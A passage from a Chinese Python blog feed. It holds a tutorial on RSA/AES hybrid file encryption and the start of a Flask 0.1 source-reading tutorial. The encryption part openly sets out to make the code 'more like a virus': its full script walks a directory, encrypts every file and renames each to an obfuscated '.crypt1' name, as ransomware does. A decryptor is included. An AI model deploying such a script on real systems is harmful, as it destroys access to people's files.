<p>公钥：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">-----BEGIN RSA PUBLIC KEY-----</div><div class="line">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzVRRmo7R3VPtsUz/uBBi</div><div class="line">/Ofb/5NKMoylH6xnFfH3WaN8oTj9706xxrNmuJ0kc4QVNDofKKogfotjVRDbe6FT</div><div class="line">7JoH9NclCNEvfiaOWnwXV6srPYBfQb7pCl4cfQ23U/EOFR2SRAIO9yYy5z8vToG3</div><div class="line">shSPKcs3dXGfnzYaJcvCwcG8Dmk09S2wLTdo7ZqPp5erG5eYa2ohV0B94SQyHvUk</div><div class="line">Bl5iYlkH0zUdnif7u47xziAM2HtWB2xMB7l3ckaltuN6qPvXkyaz50HUTbZRhVFn</div><div class="line">iHd5iaseAYxD74uLw5TYmj8s5A33lPO4oJe868ukgUl0DMSF48OX2OO4TrhYZEFJ</div><div class="line">BwIDAQAB</div><div class="line">-----END RSA PUBLIC KEY-----</div></pre></td></tr></table></figure></p>
<p>私钥：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">-----BEGIN ENCRYPTED PRIVATE KEY-----</div><div class="line">MIIFJTBPBgkqhkiG9w0BBQ0wQjAhBgkrBgEEAdpHBAswFAQI2zONWIfQCF4CAkAA</div><div class="line">AgEIAgEBMB0GCWCGSAFlAwQBAgQQLRSUFPMMc6Zds4C/tu2lKwSCBNDtbdkpf3un</div><div class="line">1hQz8nJ0x91m6FH3esDz+IGSjVBMFAT0uy5TiKv/2u3glj+sgFEM7aLOeaX3Qouk</div><div class="line">kEm5L73J28qEeZ3hqNoaMmYdzAaHuCOjHubXaii3AoKTg4PXO9Qy4v/IICTj5CQq</div><div class="line">SMSSFXlkSmfz7u4WzwQzM1LOwSwLuHVJElVCxiOBA7m4dJgNNd6iRIPyTLh2ECiK</div><div class="line">wrMgkaGbQIxYN7RMt9tm2cL5z6Ah8sRBjlDbM1QSnOEyY9NPrWqHyT/R1enjLkQp</div><div class="line">DiZUtxp5A9yjE1QEiKBvqIKTMDhGcXK1S7KXo7DWYOMpU1zZp0dLWKFmyNmi6b9H</div><div class="line">tu/HYFcV6pDDA3x+yVnDZsxcDJ/iaJJ7v6qFI04dukVbkr977PHTaUj9AbmQZf/K</div><div class="line">hnBr2BmL65h84oPhnxVk50g//DAiorPUZ5BEFNdOExlW/eiUezG+n86vtqd3VFYZ</div><div class="line">/LMlse6C+fLiwHRTbbJx2jRiIbpcBOdUcqLxdjUsFiUtuwZeh9A/9Zu3GJjd0kp2</div><div class="line">Itp1I9wrI9l56msSfO6n5//11Jjtc1ANxcJY9np1julboEyhS5H25PojXL7moUy5</div><div class="line">yWbzPe9I9xodLJGIpa0FqmEM2O0AuV4CCO3QzbVMc3fOY264wxHnIMhMhQocD9dy</div><div class="line">R1TNtfb3A5Hsj3nLVcFgpUj9WdrHfmxPAgcY2LCSxVhrKaitjUMDi3ea5G5G6DeZ</div><div class="line">f5/+Vc0M4gxyeyn7fp5DY6AEdNea2P+4UPsXdUw74jExHiYv0Zx07kGjM9Qwvg9f</div><div class="line">GUhDJvMtxuFGjBqy4wnYwGx3PvHPljONPhxpE2naXlhjsi0K39Q6P+o+bTYOBZBl</div><div class="line">icdup4feaZ9AtcN8fU3kFKPnkbQ9fLwTGA8UuJAguBW95jJ5trT8tmn4o0y3O61f</div><div class="line">nGyN3JyzwaI/fPi8QavqUti3cSTxcYDr9oXBU1ND9YLB8LKgnXE9LD3kg0a6w6kE</div><div class="line">dJPpf9OTeMFb85wf/bEviof0CgK/fGcz9DxuRvJLRLPwTfXXh3stZ33Rky/MuX1h</div><div class="line">5qmd7eDXEZmFWvi73P5R61+xGHxgarP9Ww7bX6EcC7HN9xg2QcWHDusdWaw/HE9J</div><div class="line">1pHxCzOQoxE4SclqEtTo3J9fXhQgKfKih7azWP1PpTsjvZ/J4ZwZeGWUDXzk54op</div><div class="line">Dg8PFEhAPsyRt94iKP+oKb3zHYpkcuU4UAk8+fPznZ+1hIvboryn3CfV6t29dyGE</div><div class="line">9R3VCCPLBrpy4DJhvuITjlZdeh6fhUV4SOXjUBEhNn+6wv3L3U3INvXIwfJssAf+</div><div class="line">boXk4lf209HcGz05Q6dFyN106q7UjWK/e+ometiD/wL51DoRBnS5CfrW9U1o4m4P</div><div class="line">I23mKeoaf0i7SoPz2vVF7w7vEzXXgk7wO4bN0AqeFjCMFw/hOQqZrNHcIWchsmiP</div><div class="line">wCqwj/FSGHIzGvppbTPr8qudMlXmaL1xGbyJAOAJW+qVaEwzJx7wvrchehGwzYbI</div><div class="line">YuGuWfYqKIh4+1VgQyafDuO13o5TeqdZa3ghgWiRpJse7KabbVgHLyBfxMvVuIpH</div><div class="line">qpM3qaTqsp4CICPuCFVoB5HReu0V7l1gfN++Tjo5BLV5rijyhWjnlUDRXqntnXqA</div><div class="line">2RC9vOpNMZ6L8Fp6VvA9i3ZI9RvkkeI2rw==</div><div class="line">-----END ENCRYPTED PRIVATE KEY-----</div></pre></td></tr></table></figure></p>
<p>当然每次运行的结果都不一定，公钥是公开的，任何人都可以看到，但是私钥一定要保存好，否则一旦泄露，意味着你的信息也不安全了。</p>
<h1 id="3-2-利用公钥对文件进行加密"><a href="#3-2-利用公钥对文件进行加密" class="headerlink" title="3.2 利用公钥对文件进行加密"></a>3.2 利用公钥对文件进行加密</h1><p>现在我们来看看如何对文件进行加密处理：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES, PKCS1_OAEP</div><div class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Encrypt</span><span class="params">(filename)</span>:</span>         </div><div class="line">    data = <span class="string">''</span></div><div class="line">    <span class="comment"># 二进制只读打开文件，读取文件数据</span></div><div class="line">    <span class="keyword">with</span> open(filename, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</div><div class="line">        data = f.read()</div><div class="line"></div><div class="line">    <span class="keyword">with</span> open(filename, <span class="string">'wb'</span>) <span class="keyword">as</span> out_file:</div><div class="line">        <span class="comment"># 收件人秘钥 - 公钥</span></div><div class="line">        recipient_key = RSA.import_key(open(<span class="string">'my_rsa_public.pem'</span>).read())</div><div class="line">        <span class="comment">#一个 16 字节的会话密钥</span></div><div class="line">        session_key = get_random_bytes(<span class="number">16</span>)</div><div class="line"></div><div class="line">        <span class="comment"># Encrypt the session key with the public RSA key</span></div><div class="line">        cipher_rsa = PKCS1_OAEP.new(recipient_key)</div><div class="line">        out_file.write(cipher_rsa.encrypt(session_key))</div><div class="line"></div><div class="line">        <span class="comment"># Encrypt the data with the AES session key</span></div><div class="line">        cipher_aes = AES.new(session_key, AES.MODE_EAX)</div><div class="line">       </div><div class="line">        ciphertext, tag = cipher_aes.encrypt_and_digest(data)</div><div class="line"></div><div class="line">        out_file.write(cipher_aes.nonce)</div><div class="line">        out_file.write(tag)</div><div class="line">        out_file.write(ciphertext)</div></pre></td></tr></table></figure>
<p>我们打开一个文件用于写入数据。接着我们导入公钥赋给一个变量，创建一个 16 字节的会话密钥。在这个例子中，我们将使用混合加密方法，即 PKCS#1 OAEP ，也就是最优非对称加密填充。这允许我们向文件中写入任意长度的数据。接着我们创建 AES 加密，要加密的数据，然后加密数据。我们将得到加密的文本和消息认证码。最后，我们将随机数，消息认证码和加密的文本写入文件。</p>
<p>加密后，这个时候你肯定没有办法按照原来的方式打开你的文件了，或者你能打开，显示的也是乱码。</p>
<h1 id="3-3-利用私钥对文件进行解密"><a href="#3-3-利用私钥对文件进行解密" class="headerlink" title="3.3 利用私钥对文件进行解密"></a>3.3 利用私钥对文件进行解密</h1><p>现在让我们学习如何解密我们的文件数据：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES, PKCS1_OAEP</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Descrypt</span><span class="params">(filename)</span>:</span></div><div class="line">    code = <span class="string">'nooneknows'</span></div><div class="line">    <span class="keyword">with</span> open(filename, <span class="string">'rb'</span>) <span class="keyword">as</span> fobj:</div><div class="line">        <span class="comment"># 导入私钥</span></div><div class="line">        private_key = RSA.import_key(open(<span class="string">'my_private_rsa_key.bin'</span>).read(), passphrase=code)</div><div class="line">        <span class="comment"># 会话密钥， 随机数，消息认证码，机密的数据</span></div><div class="line">        enc_session_key, nonce, tag, ciphertext = [ fobj.read(x) </div><div class="line">                                                    <span class="keyword">for</span> x <span class="keyword">in</span> (private_key.size_in_bytes(), </div><div class="line">                                                    <span class="number">16</span>, <span class="number">16</span>, <span class="number">-1</span>) ]</div><div class="line">        cipher_rsa = PKCS1_OAEP.new(private_key)</div><div class="line">        session_key = cipher_rsa.decrypt(enc_session_key)</div><div class="line">        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)</div><div class="line">        <span class="comment"># 解密</span></div><div class="line">        data = cipher_aes.decrypt_and_verify(ciphertext, tag)</div><div class="line">    </div><div class="line">    <span class="keyword">with</span> open(filename, <span class="string">'wb'</span>) <span class="keyword">as</span> wobj:</div><div class="line">        wobj.write(data)</div></pre></td></tr></table></figure>
<p>我们先以二进制模式读取我们的加密文件，然后导入私钥。注意，当你导私钥时，需要提供一个密码，否则会出现错误。然后，我们文件中读取数据，首先是加密的会话密钥，然后是 16 字节的随机数和 16 字节的消息认证码，最后是剩下的加密的数据。</p>
<p>接下来我们需要解密出会话密钥，重新创建 AES 密钥，然后解密出数据。</p>
<p>解密完成后，我们会发现刚刚打不开或者无法正确显示的文件，又恢复正常了！</p>
<h1 id="4-文件名处理"><a href="#4-文件名处理" class="headerlink" title="4 文件名处理"></a>4 文件名处理</h1><p>当然至此，文件加密的部分已经完成，但是为了使这个更像病毒，我们可以模拟黑客的做法，直接把整个文件的后缀名改掉，或者更混蛋一点，我就是想搞破坏，直接把文件名字改成一串没有意义的数值：</p>
<h1 id="4-1-文件重命名"><a href="#4-1-文件重命名" class="headerlink" title="4.1 文件重命名"></a>4.1 文件重命名</h1><p>举例比如：blog2.rar ==&gt; yFmcuIzZvxmY.crypt1</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> base64</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">RenameFile</span><span class="params">(dir,filename)</span>:</span></div><div class="line">    filename_bytes = filename.encode(<span class="string">'utf-8'</span>)</div><div class="line"></div><div class="line">    filename_bytes_base64 = base64.encodestring(filename_bytes)    </div><div class="line">    filename_bytes_base64 = filename_bytes_base64[::<span class="number">-1</span>][<span class="number">1</span>:]   <span class="comment"># 倒序</span></div><div class="line">    </div><div class="line">    new_filename = filename_bytes_base64.decode(<span class="string">'utf-8'</span>) + <span class="string">'.crypt1'</span></div><div class="line">    </div><div class="line">    <span class="comment">#print (new_filename)</span></div><div class="line">    print(os.path.join(dir, filename))</div><div class="line">    print(os.path.join(dir,new_filename))</div><div class="line">    os.rename(os.path.join(dir, filename), os.path.join(dir,new_filename))</div></pre></td></tr></table></figure>
<p>使用了base64对文件名进行编码。</p>
<h1 id="4-2-恢复文件名"><a href="#4-2-恢复文件名" class="headerlink" title="4.2 恢复文件名"></a>4.2 恢复文件名</h1><p>举例比如: yFmcuIzZvxmY.crypt1 ==&gt; blog2.rar</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> base64</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ReserveFilename</span><span class="params">(dir, filename)</span>:</span></div><div class="line">    f = filename</div><div class="line">    filename = filename[::<span class="number">-1</span>][<span class="number">7</span>:][::<span class="number">-1</span>]</div><div class="line">    filename_base64 = filename[::<span class="number">-1</span>] + <span class="string">'\n'</span></div><div class="line">    filename_bytes_base64 = filename_base64.encode(<span class="string">'utf-8'</span>)</div><div class="line">    ori_filename = base64.decodestring(filename_bytes_base64).decode(<span class="string">'utf-8'</span>)</div><div class="line">    print(os.path.join(dir, f))</div><div class="line">    print(os.path.join(dir,ori_filename))</div><div class="line">    os.rename(os.path.join(dir, f),os.path.join(dir,ori_filename))</div></pre></td></tr></table></figure>
<p>使用了base64对文件进行解码。</p>
<h1 id="5-完整源码"><a href="#5-完整源码" class="headerlink" title="5 完整源码"></a>5 完整源码</h1><p>我们把上述几个过程整合起来，然后实现对某一个目录下的所有文件进行不对称加密和不对称解密：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding=utf-8</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</div><div class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES, PKCS1_OAEP</div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> base64</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">CreateRSAKeys</span><span class="params">()</span>:</span></div><div class="line">    code = <span class="string">'nooneknows'</span></div><div class="line">    key = RSA.generate(<span class="number">2048</span>)</div><div class="line">    encrypted_key = key.exportKey(passphrase=code, pkcs=<span class="number">8</span>, protection=<span class="string">"scryptAndAES128-CBC"</span>)</div><div class="line">    <span class="comment"># 私钥</span></div><div class="line">    <span class="keyword">with</span> open(<span class="string">'my_private_rsa_key.bin'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</div><div class="line">        f.write(encrypted_key)</div><div class="line">    <span class="comment"># 公钥</span></div><div class="line">    <span class="keyword">with</span> open(<span class="string">'my_rsa_public.pem'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</div><div class="line">        f.write(key.publickey().exportKey())</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Encrypt</span><span class="params">(filename)</span>:</span>         </div><div class="line">    data = <span class="string">''</span></div><div class="line">    <span class="keyword">with</span> open(filename, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</div><div class="line">        data = f.read()</div><div class="line"></div><div class="line">    <span class="keyword">with</span> open(filename, <span class="string">'wb'</span>) <span class="keyword">as</span> out_file:</div><div class="line">        <span class="comment"># 收件人秘钥 - 公钥</span></div><div class="line">        recipient_key = RSA.import_key(open(<span class="string">'my_rsa_public.pem'</span>).read())</div><div class="line">        session_key = get_random_bytes(<span class="number">16</span>)</div><div class="line"></div><div class="line">        <span class="comment"># Encrypt the session key with the public RSA key</span></div><div class="line">        cipher_rsa = PKCS1_OAEP.new(recipient_key)</div><div class="line">        out_file.write(cipher_rsa.encrypt(session_key))</div><div class="line"></div><div class="line">        <span class="comment"># Encrypt the data with the AES session key</span></div><div class="line">        cipher_aes = AES.new(session_key, AES.MODE_EAX)</div><div class="line">        ciphertext, tag = cipher_aes.encrypt_and_digest(data)</div><div class="line"></div><div class="line">        out_file.write(cipher_aes.nonce)</div><div class="line">        out_file.write(tag)</div><div class="line">        out_file.write(ciphertext)</div><div class="line">        </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Descrypt</span><span class="params">(filename)</span>:</span></div><div class="line">    code = <span class="string">'nooneknows'</span></div><div class="line">    <span class="keyword">with</span> open(filename, <span class="string">'rb'</span>) <span class="keyword">as</span> fobj:</div><div class="line">        private_key = RSA.import_key(open(<span class="string">'my_private_rsa_key.bin'</span>).read(), passphrase=code)</div><div class="line">        enc_session_key, nonce, tag, ciphertext = [ fobj.read(x) </div><div class="line">                                                    <span class="keyword">for</span> x <span class="keyword">in</span> (private_key.size_in_bytes(), </div><div class="line">                                                    <span class="number">16</span>, <span class="number">16</span>, <span class="number">-1</span>) ]</div><div class="line">        cipher_rsa = PKCS1_OAEP.new(private_key)</div><div class="line">        session_key = cipher_rsa.decrypt(enc_session_key)</div><div class="line">        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)</div><div class="line">        data = cipher_aes.decrypt_and_verify(ciphertext, tag)</div><div class="line">    </div><div class="line">    <span class="keyword">with</span> open(filename, <span class="string">'wb'</span>) <span class="keyword">as</span> wobj:</div><div class="line">        wobj.write(data) </div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">RenameFile</span><span class="params">(dir,filename)</span>:</span></div><div class="line">    filename_bytes = filename.encode(<span class="string">'utf-8'</span>)</div><div class="line">    filename_bytes_base64 = base64.encodestring(filename_bytes)</div><div class="line">    </div><div class="line">    filename_bytes_base64 = filename_bytes_base64[::<span class="number">-1</span>][<span class="number">1</span>:]</div><div class="line">    new_filename = filename_bytes_base64.decode(<span class="string">'utf-8'</span>) + <span class="string">'.crypt1'</span></div><div class="line"></div><div class="line">    print(os.path.join(dir, filename))</div><div class="line">    print(os.path.join(dir,new_filename))</div><div class="line">    os.rename(os.path.join(dir, filename), os.path.join(dir,new_filename))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ReserveFilename</span><span class="params">(dir, filename)</span>:</span></div><div class="line">    f = filename</div><div class="line">    filename = filename[::<span class="number">-1</span>][<span class="number">7</span>:][::<span class="number">-1</span>]</div><div class="line">    filename_base64 = filename[::<span class="number">-1</span>] + <span class="string">'\n'</span></div><div class="line">    filename_bytes_base64 = filename_base64.encode(<span class="string">'utf-8'</span>)</div><div class="line"></div><div class="line">    ori_filename = base64.decodestring(filename_bytes_base64).decode(<span class="string">'utf-8'</span>)</div><div class="line">    print(os.path.join(dir, f))</div><div class="line">    print(os.path.join(dir,ori_filename))</div><div class="line">    os.rename(os.path.join(dir, f),os.path.join(dir,ori_filename))</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Main</span><span class="params">(rootDir)</span>:</span> </div><div class="line">    list_dirs = os.walk(rootDir) </div><div class="line">    <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> list_dirs: </div><div class="line">        <span class="comment"># 切换加密和解密过程</span></div><div class="line">        <span class="comment">#if False: </span></div><div class="line">        <span class="keyword">if</span> <span class="keyword">True</span>:</div><div class="line">            <span class="comment"># 遍历文件，加密并且改名</span></div><div class="line">            <span class="keyword">for</span> f <span class="keyword">in</span> files: </div><div class="line">                filename = os.path.join(root, f)</div><div class="line">                Encrypt(filename)</div><div class="line">                RenameFile(root, f)</div><div class="line">        <span class="keyword">else</span>:   </div><div class="line">            <span class="comment"># 遍历文件，解密并且恢复名字</span></div><div class="line">            <span class="keyword">for</span> f <span class="keyword">in</span> files: </div><div class="line">                filename = os.path.join(root, f)</div><div class="line">                Descrypt(filename)</div><div class="line">                ReserveFilename(root, f)</div><div class="line">            </div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="comment">#CreateRSAKeys()</span></div><div class="line">    d = <span class="string">'D:\\des'</span></div><div class="line">    Main(d)</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文教你如何用Python对文件进行不对称加密。&lt;/p&gt;
    
    </summary>
    
      <category term="Python进阶" scheme="https://maoao530.github.io/categories/Python%E8%BF%9B%E9%98%B6/"/>
    
    
      <category term="文件加密" scheme="https://maoao530.github.io/tags/%E6%96%87%E4%BB%B6%E5%8A%A0%E5%AF%86/"/>
    
      <category term="RSA" scheme="https://maoao530.github.io/tags/RSA/"/>
    
  </entry>
  
  <entry>
    <title>flask源码阅读</title>
    <link href="https://maoao530.github.io/2016/10/24/flask-source-reading/"/>
    <id>https://maoao530.github.io/2016/10/24/flask-source-reading/</id>
    <published>2016-10-24T12:26:04.000Z</published>
    <updated>2016-12-11T08:47:19.934Z</updated>
    
    <content type="html"><![CDATA[<p>Flask是一个使用 Python 编写的轻量级 Web 应用框架。其 WSGI 工具箱采用 Werkzeug ，模板引擎则使用 Jinja2 。</p>
<a id="more"></a>
<p>我们先从flask 0.1版本阅读起。</p>
<h1 id="1-安装Flask-0-1"><a href="#1-安装Flask-0-1" class="headerlink" title="1 安装Flask 0.1"></a>1 安装Flask 0.1</h1><p>因为flask 0.1暂时不支持python3，所以我们使用python2.7版本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">py <span class="number">-2</span> -m pip install flask==<span class="number">0.1</span></div></pre></td></tr></table></figure>
<h1 id="2-Hello-World"><a href="#2-Hello-World" class="headerlink" title="2 Hello World"></a>2 Hello World</h1><p>这是一个很简单的示例，编写hello.py，参考官方网站的示例：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</div><div class="line">app = Flask(__name__)</div><div class="line"><span class="meta">@app.route("/")</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span>    </div><div class="line">    <span class="keyword">return</span> <span class="string">"Hello World!"</span></div><div class="line"> </div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    app.run()</div></pre></td></tr></table></figure>
<p>运行hello.py后，打开浏览器访问 localhost:5000可以看到浏览器输出Hello World!。</p>
<h1 id="3-知识准备"><a href="#3-知识准备" class="headerlink" title="3 知识准备"></a>3 知识准备</h1><p>在对flask有了一个比较简单的认识之后，我们知道，flask是基于Jinja2和Werkzeug的一个框架，其WSGI工具箱采用Werkzeug，模板引擎则使用 Jinja2。</p>
<h1 id="3-1-WSGI"><a href="#3-1-WSGI" class="headerlink" title="3.1 WSGI"></a>3.1 WSGI</h1><p>WSGI是Web Server Gateway Interface的缩写，是为Python语言定义的Web服务器和Web应用程序或框架之间的一种简单而通用的接口。引用一张图说明WSGI的位置：</p>
<p><img src="" alt=""></p>
<p>WSGI接口定义非常简单，它只要求Web开发者实现一个函数，就可以响应HTTP请求。我们来看一个hello world：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># args:</span></div><div class="line"><span class="comment">#  - environ：一个包含所有HTTP请求信息的dict对象；</span></div><div class="line"><span class="comment">#  - start_response：一个发送HTTP响应的函数。</span></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">application</span><span class="params">(environ, start_response)</span>:</span></div><div class="line">    start_response(<span class="string">'200 OK'</span>, [(<span class="string">'Content-Type'</span>, <span class="string">'text/html'</span>)])</div><div class="line">    <span class="keyword">return</span> [<span class="string">b'&lt;h1&gt;Hello, web!&lt;/h1&gt;'</span>]</div></pre></td></tr></table></figure>
<ol>
<li>上面的application()函数就是符合WSGI标准的一个HTTP处理函数，函数必须由WSGI服务器来调用。</li>
<li>environ是一个字典，该字典可以包含了客户端请求的信息以及其他信息，可以认为是请求上下文，一般叫做environment（编码中多简写为environ、env）</li>
<li>start_response返回了http响应的header，Header只能发送一次，也就是这个函数只能调用一次。<br>有很多符合WSGI规范的服务器，我们可以挑选一个来用。比如：</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> eventlet <span class="keyword">import</span> wsgi</div><div class="line"><span class="keyword">import</span> eventlet</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">(environ, start_response)</span>:</span></div><div class="line">    start_response(<span class="string">'200 OK'</span>, [(<span class="string">'Content-Type'</span>, <span class="string">'text/plain'</span>)])</div><div class="line">    <span class="keyword">return</span> [<span class="string">'Hello, World!\r\n'</span>]</div><div class="line">wsgi.server(eventlet.listen((<span class="string">''</span>, <span class="number">8090</span>)), hello_world)</div></pre></td></tr></table></figure>
<p>3.2 Jinja2</p>
<p>Jinja2是一个模板引擎，jinja2内部使用Unicode，一个比较简单的示例如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</div><div class="line">template = Template(<span class="string">'Hello &#123;&#123; name &#125;&#125;!'</span>)</div><div class="line">s = template.render(name=<span class="string">'Shun'</span>)</div><div class="line">print(s)  <span class="comment"># Hello Shun!</span></div></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Environment, PackageLoader</div><div class="line">env = Environment(loader = PackageLoader(<span class="string">'module_name'</span>, <span class="string">'templates_dir'</span>))</div><div class="line">template2 = env.get_template(<span class="string">'my_template.html'</span>) <span class="comment"># 'Hello &#123;&#123; name &#125;&#125;!'</span></div><div class="line">s = template2.render(name = <span class="string">'shun'</span>)  <span class="comment"># Hello shun!</span></div></pre></td></tr></table></figure>
<p>更高级的用法可以参考官方文档 : <a href="http://docs.jinkan.org/docs/jinja2/" target="_blank" rel="external">http://docs.jinkan.org/docs/jinja2/</a></p>
